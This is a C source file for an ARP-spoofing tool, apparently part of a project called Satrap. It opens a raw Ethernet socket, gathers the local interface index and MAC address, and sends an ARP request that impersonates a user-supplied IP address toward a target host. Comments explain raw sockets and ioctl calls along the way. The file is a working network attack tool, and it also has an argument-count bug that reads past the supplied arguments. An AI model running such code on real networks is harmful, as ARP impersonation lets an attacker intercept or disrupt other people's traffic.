/* Satrap/arp_spoof.c */

#include "arp.h"

int main(int argc, char **argv)
{

  /* ARGUMENT PARSING
     - network interface to use
     - target IP address
  */
  
  if (argc < 3) {
    printf("[FAIL] Too few arguments\n"
	   "Usage: %s <interface> <target IP address> <IP address to impersonate>\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  char *if_name = argv[1];

  char *target_ip_string = argv[2];
  struct in_addr target_ip;
  if (!inet_pton(AF_INET, target_ip_string, &target_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }

  char *source_ip_string = argv[3];
  struct in_addr source_ip;
  if (!inet_pton(AF_INET, source_ip_string, &source_ip)) {
    perror("[FAIL] inet_pton() (badly formatted IP address)");
    exit(EXIT_FAILURE);
  }
  printf("ARP request to IP address %s on interface %s, impersonating %s\n",
	 target_ip_string, if_name, source_ip_string);



  /* ====================================================================== */

  /* RAW SOCKET CREATION */
  
  /* We open the raw socket */
  /* AF_PACKET: This is a raw Ethernet packet (Linux only, requires root)
     SOCK_DGRAM: The link-layer header is constructed automatically
     (to build it ourselves, we could have used SOCK_RAW)
     ETH_P_ALL: We want to listen to every EtherType (here, we could 
     also have chosen ETH_P_ARP) */
  int sockfd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL));
  if (sockfd < 0) {
    perror("[FAIL] socket()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Raw Ethernet socket started successfully\n");
#endif



  /* ====================================================================== */

  /* INFORMATION ON THE LOCAL COMPUTER:
     - index number of the network interface
     - local IP address
     - local MAC address
  */

  /* Since this is very low-level, we can't use the usual interface
     name (e.g. "eth0"), so we need to get the index number of the
     ethernet interface. */
  //char *if_name = "wlp3s0"; /* Change this if needed */
  struct ifreq ifrindex;
  size_t if_name_len = strlen(if_name);
  if (if_name_len < sizeof(ifrindex.ifr_name)) {
    memcpy(ifrindex.ifr_name, if_name, if_name_len);
    ifrindex.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  /* We use ioctl() with SIOCGIFINDEX */
  if (ioctl(sockfd, SIOCGIFINDEX, &ifrindex) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  int ifindex = ifrindex.ifr_ifindex;
#ifdef DEBUG
  printf("[OK] Index number of the Ethernet interface %s: %d\n", if_name, ifindex);
#endif

  /* We get the MAC address using ioctl() (again) with SIOCGIFHWADDR */
  struct ifreq ifrhwaddr;
  if (if_name_len < sizeof(ifrhwaddr.ifr_name)) {
    memcpy(ifrhwaddr.ifr_name, if_name, if_name_len);
    ifrhwaddr.ifr_name[if_name_len] = 0;
  }
  else {
    printf("[FAIL] Error: interface name is too long\n");
  }
  if (ioctl(sockfd, SIOCGIFHWADDR, &ifrhwaddr) == -1) {
    perror("[FAIL] ioctl()");
    exit(EXIT_FAILURE);
  }
  unsigned char *macaddr = (unsigned char *) &ifrhwaddr.ifr_hwaddr.sa_data;
#ifdef DEBUG
  printf("[OK] Local MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
	 macaddr[0], macaddr[1], macaddr[2], macaddr[3], macaddr[4], macaddr[5]);
#endif

  /* We don't need the real local IP address, we'll use source_ip
     instead */
  struct sockaddr_in *ipaddr = malloc(sizeof(struct sockaddr_in));
  ipaddr->sin_family = AF_INET;
  ipaddr->sin_port = htons(5746);
  ipaddr->sin_addr = source_ip;
  char source_ip_string2[16];
  if (!inet_ntop(AF_INET, &ipaddr->sin_addr, source_ip_string2, sizeof(source_ip_string2))) {
    perror("[FAIL] inet_ntop()");
    exit(EXIT_FAILURE);
  }
#ifdef DEBUG
  printf("[OK] Local IP address: %s\n", source_ip_string2);
#endif


  /* ====================================================================== */

  send_arp_request(sockfd, ifindex, ipaddr, macaddr, target_ip);
  
  
  
  exit(EXIT_SUCCESS);
}
